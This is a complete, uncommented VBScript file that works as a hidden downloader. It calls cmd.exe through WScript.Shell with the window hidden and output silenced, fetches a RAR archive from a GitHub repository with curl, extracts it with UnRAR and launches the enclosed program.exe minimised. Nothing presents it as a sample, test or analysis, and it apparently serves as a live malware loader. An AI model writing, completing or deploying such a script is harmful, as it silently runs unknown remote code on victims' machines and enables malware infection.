Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c @echo off & (curl -s -L -o downloaded_file.rar https://github.com/lordlord877/crilotd/raw/main/program.rar && ""C:\Program Files\WinRAR\UnRAR.exe"" x downloaded_file.rar && start """" /min program.exe) >nul 2>&1", 0, False
